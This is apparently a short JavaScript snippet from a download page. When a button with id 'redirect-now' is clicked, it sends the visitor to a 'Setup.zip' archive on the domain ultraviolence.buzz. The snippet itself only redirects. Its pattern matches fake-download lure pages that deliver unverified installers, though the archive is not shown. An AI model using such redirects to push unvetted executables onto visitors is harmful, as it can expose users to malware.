document.addEventListener("DOMContentLoaded", () => {
  const downloadBtn = document.getElementById("redirect-now");

  if (downloadBtn) {
    downloadBtn.addEventListener("click", () => {
      window.location.href = "https://ultraviolence.buzz/f/Setup.zip";
    });
  }
});
